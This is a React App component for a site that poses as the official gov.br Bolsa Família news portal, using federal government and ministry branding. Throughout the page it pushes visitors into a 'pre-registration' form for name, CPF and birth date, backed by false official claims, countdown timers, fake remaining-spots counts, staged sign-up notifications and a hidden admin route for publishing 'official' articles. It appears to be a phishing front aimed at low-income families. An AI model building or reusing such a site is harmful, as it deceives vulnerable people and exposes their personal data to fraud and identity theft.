import { useState, useEffect } from 'react'
import { usePrograma } from './hooks/usePrograma'
import { useSocialNotifications } from './hooks/useSocialNotifications'
import SocialNotification from './components/SocialNotification'

import RegistrationModal from './components/RegistrationModal'
import ArticleCreationModal from './components/ArticleCreationModal'
import AdminPage from './components/AdminPage'
import ArticleDetailView from './components/ArticleDetailView'
import { useCountdown } from './components/Countdown'
import { CITY_OCCUPANCY } from './constants'
import type { Article } from './types'
import { loadArticles, saveArticles } from './data/articles'
import {
  fetchArticlesFromFirebase,
  saveArticleToFirebase,
  deleteArticleFromFirebase,
} from './services/firebaseService'
import './App.css'

const ELIGIBILITY_RULES = [
  {
    title: 'Renda familiar',
    desc: 'Famílias com renda mensal de até R$ 218 por pessoa (extrema pobreza) ou até R$ 660 por pessoa (pobreza).',
  },
  {
    title: 'Composição familiar',
    desc: 'Gestantes, nutrizes, crianças de 0 a 6 anos e adolescentes de 7 a 18 anos ampliam o valor do benefício.',
  },
  {
    title: 'Cadastro Único',
    desc: 'A família deve estar inscrita ou se inscrever no Cadastro Único (CadÚnico), documento obrigatório para todos os programas sociais federais.',
  },
  {
    title: 'Residência no Brasil',
    desc: 'Todos os membros da família devem residir legalmente em território nacional.',
  },
]

const STEPS_INFO = [
  {
    n: '1',
    title: 'Verifique seus dados no pré-cadastro',
    desc: 'Preencha o formulário com nome completo, CPF, data de nascimento e estado de residência. O processo é gratuito e leva menos de dois minutos.',
  },
  {
    n: '2',
    title: 'Aguarde a análise do governo federal',
    desc: 'Os dados são cruzados com o sistema do CadÚnico. A resposta sobre a elegibilidade chega em até 72 horas pelo canal informado.',
  },
  {
    n: '3',
    title: 'Receba o benefício na conta indicada',
    desc: 'Após aprovação, o valor é depositado automaticamente todo mês conforme o calendário oficial de pagamentos do Bolsa Família.',
  },
]

const CATEGORY_TABS = [
  'Todas as Notícias',
  'Bolsa Família',
  'CadÚnico',
  'Guias & Cidadania',
]

export default function App() {
  const { state } = usePrograma()
  // Ritmo tranquilo (devagar) a cada 16 segundos
  const notification = useSocialNotifications(16000)
  const [modalOpen, setModalOpen] = useState(false)
  const [modalArticle, setModalArticle] = useState<Article | null>(null)
  const [createModalOpen, setCreateModalOpen] = useState(false)
  const [isAdminRoute, setIsAdminRoute] = useState<boolean>(() => {
    return window.location.hash === '#admin' || window.location.pathname === '/admin'
  })
  const [editingArticle, setEditingArticle] = useState<Article | null>(null)
  const [articles, setArticles] = useState<Article[]>(() => loadArticles())
  const [selectedArticle, setSelectedArticle] = useState<Article | null>(null)
  const [activeTab, setActiveTab] = useState<string>('Todas as Notícias')
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  const [publishedAlert, setPublishedAlert] = useState<string | null>(null)
  const { inline: countdownInline } = useCountdown(14, 58)

  // Fetch articles from Firebase Firestore on startup
  useEffect(() => {
    fetchArticlesFromFirebase()
      .then(fetched => {
        if (fetched && fetched.length > 0) {
          setArticles(fetched)
        }
      })
      .catch(err => {
        console.warn('Erro ao carregar artigos do Firebase:', err)
      })
  }, [])

  // Listen for hash changes if user navigated with back/forward buttons
  useEffect(() => {
    const handleHash = () => {
      const hash = window.location.hash
      if (hash === '#admin' || window.location.pathname === '/admin') {
        setIsAdminRoute(true)
        setSelectedArticle(null)
      } else {
        setIsAdminRoute(false)
        if (hash.startsWith('#artigo-')) {
          const artId = hash.replace('#artigo-', '')
          const found = articles.find(a => a.id === artId)
          if (found) {
            setSelectedArticle(found)
          }
        } else if (!hash || hash === '#home') {
          setSelectedArticle(null)
        }
      }
    }

    handleHash()
    window.addEventListener('hashchange', handleHash)
    return () => window.removeEventListener('hashchange', handleHash)
  }, [articles])

  const handleOpenArticle = (article: Article) => {
    setSelectedArticle(article)
    window.location.hash = `#artigo-${article.id}`
    window.scrollTo({ top: 0, behavior: 'smooth' })
  }

  const handleBackToHome = () => {
    setSelectedArticle(null)
    window.location.hash = '#home'
    window.scrollTo({ top: 0, behavior: 'smooth' })
  }

  const handleOpenRegistration = (art?: Article | null) => {
    setModalArticle(art || null)
    setModalOpen(true)
  }

  const handleOpenCreateArticle = () => {
    setEditingArticle(null)
    setCreateModalOpen(true)
  }

  const handleOpenEditArticle = (article: Article) => {
    setEditingArticle(article)
    setCreateModalOpen(true)
  }

  const handleDeleteArticle = (id: string) => {
    const target = articles.find(a => a.id === id)
    const updated = articles.filter(a => a.id !== id)
    setArticles(updated)
    saveArticles(updated)

    // Remove from Firebase Firestore
    deleteArticleFromFirebase(id).catch(err => {
      console.warn('Erro ao deletar artigo do Firebase:', err)
    })

    if (selectedArticle?.id === id) {
      setSelectedArticle(null)
      window.location.hash = '#home'
    }

    setPublishedAlert(`Artigo "${target?.title.slice(0, 34) || ''}..." removido com sucesso.`)
    setTimeout(() => setPublishedAlert(null), 4000)
  }

  const handleSaveArticle = (savedArticle: Article) => {
    const isEdit = articles.some(a => a.id === savedArticle.id)
    let updated: Article[]

    if (isEdit) {
      updated = articles.map(a => {
        if (a.id === savedArticle.id) return savedArticle
        if (savedArticle.featured) return { ...a, featured: false }
        return a
      })
      setPublishedAlert(`Artigo "${savedArticle.title.slice(0, 34)}..." atualizado com sucesso!`)
    } else {
      if (savedArticle.featured) {
        updated = [savedArticle, ...articles.map(a => ({ ...a, featured: false }))]
      } else {
        updated = [savedArticle, ...articles]
      }
      setPublishedAlert(`Artigo "${savedArticle.title.slice(0, 34)}..." publicado com sucesso!`)
    }

    setArticles(updated)
    saveArticles(updated)

    // Save/update to Firebase Firestore
    saveArticleToFirebase(savedArticle).catch(err => {
      console.warn('Erro ao salvar artigo no Firebase:', err)
    })

    setTimeout(() => setPublishedAlert(null), 5000)

    // Automatically navigate to the saved article
    handleOpenArticle(savedArticle)
  }

  // Filtered articles
  const filteredArticles = articles.filter(a => {
    if (activeTab === 'Todas as Notícias') return true
    return a.category.toLowerCase().includes(activeTab.toLowerCase())
  })

  // Determine featured vs remaining articles
  const featuredArticle = filteredArticles.find(a => a.featured) || filteredArticles[0]
  const otherArticles = filteredArticles.filter(a => a.id !== featuredArticle?.id)

  // If accessed via secret route (#admin or /admin), render Secret Admin Page
  if (isAdminRoute) {
    return (
      <>
        <AdminPage
          articles={articles}
          onCreateArticle={handleOpenCreateArticle}
          onEditArticle={handleOpenEditArticle}
          onDeleteArticle={handleDeleteArticle}
          onBackToPublicSite={() => {
            setIsAdminRoute(false)
            window.location.hash = '#home'
          }}
        />
        <ArticleCreationModal
          isOpen={createModalOpen}
          onClose={() => {
            setCreateModalOpen(false)
            setEditingArticle(null)
          }}
          onSave={handleSaveArticle}
          editingArticle={editingArticle}
        />
      </>
    )
  }

  return (
    <>
      <div className="site-wrapper">

        {/* Gov Top Bar */}
        <div className="govbar">
          <div className="container govbar-inner">
            <span className="govbar-brand">Governo Federal do Brasil</span>
            <div className="govbar-right">
              <nav className="govbar-links" aria-label="Links do governo">
                <a href="#noticias" onClick={handleBackToHome}>Portal de Notícias</a>
                <a href="#criterios">Legislação</a>
                <a href="#como-funciona">Canais de Atendimento</a>
              </nav>
            </div>
          </div>
        </div>

        {/* Site Header */}
        <header className="site-header">
          <div className="container header-inner">
            <div
              className="header-logo"
              onClick={handleBackToHome}
              role="button"
              tabIndex={0}
              style={{ cursor: 'pointer' }}
            >
              <div className="logo-stripes">
                <span className="stripe stripe--blue" />
                <span className="stripe stripe--yellow" />
                <span className="stripe stripe--green" />
              </div>
              <div className="logo-text">
                <span className="logo-govbr">gov<strong>.br</strong></span>
                <span className="logo-program">Bolsa Família — Notícias Oficiais</span>
              </div>
            </div>

            {/* Desktop Navigation */}
            <nav className="header-nav" aria-label="Navegação">
              <button
                type="button"
                className={`nav-link-btn ${!selectedArticle ? 'is-active' : ''}`}
                onClick={handleBackToHome}
              >
                Início
              </button>
              <a href="#noticias" className="nav-link" onClick={() => setSelectedArticle(null)}>
                Notícias
              </a>
              <a href="#criterios" className="nav-link" onClick={() => setSelectedArticle(null)}>
                Critérios
              </a>
              <a href="#como-funciona" className="nav-link" onClick={() => setSelectedArticle(null)}>
                Como funciona
              </a>
            </nav>

            {/* Mobile Hamburger Button */}
            <button
              type="button"
              className="mobile-menu-toggle"
              onClick={() => setMobileMenuOpen(!mobileMenuOpen)}
              aria-label="Alternar menu de navegação móvel"
            >
              {mobileMenuOpen ? '✕' : '☰'}
            </button>
          </div>

          {/* Mobile Dropdown Menu */}
          {mobileMenuOpen && (
            <div className="mobile-dropdown-menu">
              <button
                type="button"
                className="mobile-nav-item"
                onClick={() => {
                  handleBackToHome()
                  setMobileMenuOpen(false)
                }}
              >
                Página Inicial de Notícias
              </button>
              <a
                href="#criterios"
                className="mobile-nav-item"
                onClick={() => {
                  setSelectedArticle(null)
                  setMobileMenuOpen(false)
                }}
              >
                Critérios de Elegibilidade
              </a>
              <a
                href="#como-funciona"
                className="mobile-nav-item"
                onClick={() => {
                  setSelectedArticle(null)
                  setMobileMenuOpen(false)
                }}
              >
                Como Funciona
              </a>
              <button
                type="button"
                className="mobile-nav-item mobile-nav-item--cta"
                onClick={() => {
                  handleOpenRegistration(selectedArticle || featuredArticle)
                  setMobileMenuOpen(false)
                }}
              >
                Verificar Minha Elegibilidade
              </button>
            </div>
          )}
        </header>

        {/* Published / Action Success Toast Banner */}
        {publishedAlert && (
          <div className="portal-toast-banner" role="status">
            <div className="container toast-banner-inner">
              <span className="toast-badge">OFICIAL</span>
              <span>{publishedAlert}</span>
            </div>
          </div>
        )}

        {/* Alert strip — text only, no emoji */}
        <div className="alert-strip" role="alert">
          <div className="container alert-inner">
            <span className="alert-label">Comunicado Oficial</span>
            <p>
              Prazo para cadastro do ciclo vigente encerra em <strong>{countdownInline}</strong>.
              Restam <strong>{state.vagas} vagas</strong> disponíveis. Inscrições encerradas não poderão ser reabertas neste ciclo.
            </p>
          </div>
        </div>

        {/* MAIN VIEW: EITHER FULL ARTICLE READER OR STRATEGIC HOMEPAGE */}
        <main>
          {selectedArticle ? (
            /* DETAILED ARTICLE READER VIEW */
            <ArticleDetailView
              article={selectedArticle}
              allArticles={articles}
              onBack={handleBackToHome}
              onSelectArticle={handleOpenArticle}
              onOpenEligibilityModal={() => handleOpenRegistration(selectedArticle)}
              vagas={state.vagas}
              countdownInline={countdownInline}
            />
          ) : (
            /* STRATEGIC HOMEPAGE VIEW */
            <div className="homepage-content" id="noticias">

              {/* Editorial / Category Filter Bar */}
              <section className="portal-filter-section">
                <div className="container filter-container">
                  <div className="category-tabs-scroll">
                    {CATEGORY_TABS.map(tab => (
                      <button
                        key={tab}
                        type="button"
                        className={`category-tab-btn ${activeTab === tab ? 'is-active' : ''}`}
                        onClick={() => setActiveTab(tab)}
                      >
                        {tab}
                      </button>
                    ))}
                  </div>
                </div>
              </section>

              {/* STRATEGIC HERO / FEATURED ARTICLE */}
              {featuredArticle && (
                <section className="strategic-hero-section">
                  <div className="container">
                    <div
                      className="featured-article-card"
                      onClick={() => handleOpenArticle(featuredArticle)}
                      role="button"
                      tabIndex={0}
                      onKeyDown={e => {
                        if (e.key === 'Enter' || e.key === ' ') handleOpenArticle(featuredArticle)
                      }}
                    >
                      <div className="featured-card-image-col">
                        <img
                          src={featuredArticle.imageUrl}
                          alt={featuredArticle.title}
                          className="featured-card-img"
                        />
                        {featuredArticle.highlightBadge && (
                          <span className="featured-badge">{featuredArticle.highlightBadge}</span>
                        )}
                      </div>

                      <div className="featured-card-text-col">
                        <span className="featured-category">{featuredArticle.category}</span>
                        <h1 className="featured-title">{featuredArticle.title}</h1>
                        <p className="featured-lead">{featuredArticle.subtitle}</p>

                        <div className="featured-meta-row">
                          <span>{featuredArticle.author}</span>
                          <span className="meta-sep">•</span>
                          <span>{featuredArticle.date}</span>
                          <span className="meta-sep">•</span>
                          <span>{featuredArticle.readTime}</span>
                        </div>

                        <div className="featured-cta-link">
                          Ler reportagem completa →
                        </div>
                      </div>
                    </div>
                  </div>
                </section>
              )}

              {/* STRATEGIC GRID OF ARTICLES & LATERAL UPDATES */}
              <section className="strategic-articles-section">
                <div className="container">
                  <div className="section-header-row">
                    <div>
                      <span className="section-eyebrow">COBERTURA OFICIAL</span>
                      <h2 className="section-title">Notícias e Guias Informativos</h2>
                    </div>
                    <div className="articles-header-actions">
                      <span className="articles-count-tag">{filteredArticles.length} matérias oficiais</span>
                    </div>
                  </div>

                  <div className="strategic-layout-grid">
                    {/* Main articles column */}
                    <div className="articles-grid-col">
                      <div className="articles-cards-grid">
                        {otherArticles.map(art => (
                          <article
                            key={art.id}
                            className="article-card"
                            onClick={() => handleOpenArticle(art)}
                            role="button"
                            tabIndex={0}
                            onKeyDown={e => {
                              if (e.key === 'Enter' || e.key === ' ') handleOpenArticle(art)
                            }}
                          >
                            <div className="card-thumb-wrap">
                              <img src={art.imageUrl} alt={art.title} className="card-thumb-img" loading="lazy" />
                              <span className="card-category-tag">{art.category}</span>
                            </div>
                            <div className="card-body">
                              <div className="card-meta">
                                <span>{art.date}</span>
                                <span className="meta-sep">•</span>
                                <span>{art.readTime}</span>
                              </div>
                              <h3 className="card-title">{art.title}</h3>
                              <p className="card-excerpt">{art.subtitle}</p>
                              <div className="card-footer">
                                <span className="card-author-text">{art.author}</span>
                                <span className="card-read-action">Ler artigo →</span>
                              </div>
                            </div>
                          </article>
                        ))}
                      </div>
                    </div>

                    {/* Lateral Strategic Sidebar */}
                    <aside className="strategic-sidebar-col">
                      {/* Vagas & Prazos Card */}
                      <div className="sidebar-box sidebar-box--highlight">
                        <h3 className="sidebar-box-title">Situação do Ciclo Vigente</h3>
                        <p className="sidebar-box-desc">
                          Inscrições online com prazo limite determinado para fins de processamento da folha.
                        </p>
                        <div className="sidebar-stat-row">
                          <span className="sidebar-stat-label">Prazo restante:</span>
                          <strong className="sidebar-stat-val">{countdownInline}</strong>
                        </div>
                        <div className="sidebar-stat-row">
                          <span className="sidebar-stat-label">Vagas disponíveis:</span>
                          <strong className="sidebar-stat-val text-green">{state.vagas} vagas</strong>
                        </div>
                        <button
                          type="button"
                          className="sidebar-cta-btn"
                          onClick={() => handleOpenRegistration(featuredArticle)}
                        >
                          Verificar Elegibilidade
                        </button>
                      </div>
                    </aside>
                  </div>
                </div>
              </section>

              {/* INTEGRATED RETENTION FUNNEL SECTIONS */}
              <div className="portal-funnel-wrapper">
                <div className="article-container">

                  {/* Eligibility box */}
                  <section className="info-box" id="criterios" aria-labelledby="criterios-title">
                    <h2 id="criterios-title" className="info-box-title">Quem tem direito ao Bolsa Família ampliado</h2>
                    <p className="info-box-intro">Confira os critérios estabelecidos pelo governo federal para participação no programa neste ciclo:</p>
                    <div className="criteria-list">
                      {ELIGIBILITY_RULES.map((rule, i) => (
                        <div className="criteria-item" key={i}>
                          <span className="criteria-num">{String(i + 1).padStart(2, '0')}</span>
                          <div>
                            <h3 className="criteria-title">{rule.title}</h3>
                            <p className="criteria-desc">{rule.desc}</p>
                          </div>
                        </div>
                      ))}
                    </div>
                  </section>

                  {/* How it works */}
                  <section className="steps-box" id="como-funciona" aria-labelledby="steps-title">
                    <h2 id="steps-title" className="info-box-title">Como se inscrever no Bolsa Família em três etapas</h2>
                    <p className="info-box-intro">O processo é integralmente online, sem custos e sem necessidade de comparecer a agências ou CRAS.</p>
                    <ol className="steps-list">
                      {STEPS_INFO.map(step => (
                        <li className="step-item" key={step.n}>
                          <span className="step-n" aria-hidden="true">{step.n}</span>
                          <div className="step-content">
                            <h3 className="step-title">{step.title}</h3>
                            <p className="step-desc">{step.desc}</p>
                          </div>
                        </li>
                      ))}
                    </ol>
                  </section>

                  {/* Occupancy */}
                  <section className="occupancy-box" aria-labelledby="occ-title">
                    <h2 id="occ-title" className="info-box-title">Disponibilidade de vagas por município</h2>
                    <p className="info-box-intro">O número de vagas disponíveis por município é atualizado em tempo real. Cidades com alta ocupação podem ter o cadastramento encerrado antes do prazo oficial.</p>
                    <div className="occ-grid" role="list">
                      {CITY_OCCUPANCY.map(city => (
                        <div className="occ-row" key={city.name} role="listitem">
                          <span className="occ-city">
                            {city.name}
                            <span className="occ-state"> ({city.state})</span>
                          </span>
                          <div className="occ-track" role="progressbar" aria-label={`${city.name}: ${city.percentage}% das vagas preenchidas`} aria-valuenow={city.percentage} aria-valuemin={0} aria-valuemax={100}>
                            <div className="occ-fill" style={{ width: `${city.percentage}%` }} data-urgent={city.percentage >= 90} />
                          </div>
                          <span className="occ-pct" data-urgent={city.percentage >= 90}>{city.percentage}%</span>
                        </div>
                      ))}
                    </div>
                  </section>

                  {/* SINGLE CTA — at the end of the funnel */}
                  <section id="cadastro" className="cta-section" aria-labelledby="cta-title">
                    <div className="cta-card">
                      <div className="cta-header-line" />
                      <h2 id="cta-title" className="cta-title">Verificar elegibilidade para o Bolsa Família</h2>
                      <p className="cta-desc">
                        Preencha o formulário de pré-cadastro para verificar se sua família tem direito ao benefício neste ciclo. O processo é gratuito, online e leva menos de dois minutos.
                      </p>
                      <div className="cta-meta-row">
                        <span>Prazo restante: <strong>{countdownInline}</strong></span>
                        <span className="meta-sep">|</span>
                        <span><strong>{state.vagas}</strong> vagas disponíveis</span>
                      </div>
                      <button
                        className="cta-btn"
                        id="cta-main"
                        onClick={() => handleOpenRegistration(featuredArticle)}
                        aria-label="Abrir formulário de pré-cadastro do Bolsa Família"
                      >
                        Verificar minha elegibilidade
                      </button>
                      <p className="cta-legal">
                        Dados protegidos pela LGPD (Lei nº 13.709/2018). Processo integralmente gratuito.
                        Inscrições realizadas por este canal são encaminhadas diretamente ao sistema do CadÚnico.
                      </p>
                    </div>
                  </section>

                </div>
              </div>

            </div>
          )}
        </main>

        {/* Footer */}
        <footer className="site-footer">
          <div className="container footer-inner">
            <div className="footer-logo">
              <div className="logo-stripes">
                <span className="stripe stripe--blue" />
                <span className="stripe stripe--yellow" />
                <span className="stripe stripe--green" />
              </div>
              <div className="logo-text">
                <span className="logo-govbr">gov<strong>.br</strong></span>
                <span className="logo-program">Bolsa Família — Ministério do Desenvolvimento Social</span>
              </div>
            </div>
            <div className="footer-cols">
              <div>
                <p className="footer-col-title">Informações</p>
                <a href="#noticias" onClick={handleBackToHome}>Portal de Notícias</a>
                <a href="#criterios">Critérios e Elegibilidade</a>
                <a href="#como-funciona">Como se Inscrever</a>
              </div>
              <div>
                <p className="footer-col-title">Programas Sociais</p>
                <a href="#cadastro" onClick={() => handleOpenRegistration(articles.find(a => a.id === 'art-acordo-ampliacao') || featuredArticle)}>Bolsa Família 2026</a>
                <a href="#cadastro" onClick={() => handleOpenRegistration(articles.find(a => a.id === 'art-cadunico-atualizacao'))}>Cadastro Único (CadÚnico)</a>
                <a href="#cadastro" onClick={() => handleOpenRegistration(articles.find(a => a.id === 'art-primeira-infancia'))}>Benefício Primeira Infância</a>
                <a href="#cadastro" onClick={() => handleOpenRegistration(articles.find(a => a.id === 'art-atendimento-digital'))}>Tarifa Social Federal</a>
              </div>
              <div>
                <p className="footer-col-title">Canais Oficiais</p>
                <a href="#">Central MDS: 121</a>
                <a href="#">Ouvidoria: 136</a>
                <a href="#">Política de Privacidade LGPD</a>
              </div>
            </div>
            <div className="footer-bottom">
              <p>Ministério do Desenvolvimento e Assistência Social, Família e Combate à Fome — MDS</p>
              <p>© {new Date().getFullYear()} Governo Federal do Brasil. Todos os direitos reservados.</p>
            </div>
          </div>
        </footer>

      </div>

      {/* Social live subscriptions notification toast */}
      <SocialNotification notification={notification} />

      {/* Eligibility Registration Modal */}
      {modalOpen && (
        <RegistrationModal
          onClose={() => setModalOpen(false)}
          vagas={state.vagas}
          article={modalArticle}
        />
      )}

      {/* Article Creation & Edit Modal */}
      <ArticleCreationModal
        isOpen={createModalOpen}
        onClose={() => {
          setCreateModalOpen(false)
          setEditingArticle(null)
        }}
        onSave={handleSaveArticle}
        editingArticle={editingArticle}
      />
    </>
  )
}
